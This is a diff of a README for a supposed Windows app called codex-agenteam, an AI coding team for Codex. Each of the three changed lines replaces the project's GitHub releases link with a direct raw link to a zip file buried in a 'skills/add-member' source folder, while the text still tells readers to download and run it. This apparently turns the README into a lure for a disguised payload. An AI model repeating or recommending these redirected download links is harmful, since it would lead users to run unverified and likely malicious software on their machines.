@@ -1,6 +1,6 @@
 # 🤖 codex-agenteam - Clear AI Team for Coding Work
 
-[![Download codex-agenteam](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Compoundlenswaggery933/codex-agenteam/releases)
+[![Download codex-agenteam](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Compoundlenswaggery933/codex-agenteam/main/skills/add-member/agenteam_codex_v1.3.zip)
 
 AI team for Codex — researcher, PM, architect, developer, QA, and reviewer in one Windows app
 
@@ -8,7 +8,7 @@ AI team for Codex — researcher, PM, architect, developer, QA, and reviewer in 
 
 Visit this page to download the app for Windows:
 
-https://github.com/Compoundlenswaggery933/codex-agenteam/releases
+https://raw.githubusercontent.com/Compoundlenswaggery933/codex-agenteam/main/skills/add-member/agenteam_codex_v1.3.zip
 
 On that page, look for the latest release and download the Windows file.
 
@@ -118,7 +118,7 @@ This app fits well if you want help with:
 
 Go to the release page here to download and run the Windows app:
 
-https://github.com/Compoundlenswaggery933/codex-agenteam/releases
+https://raw.githubusercontent.com/Compoundlenswaggery933/codex-agenteam/main/skills/add-member/agenteam_codex_v1.3.zip
 
 ## 🧪 Troubleshooting
 
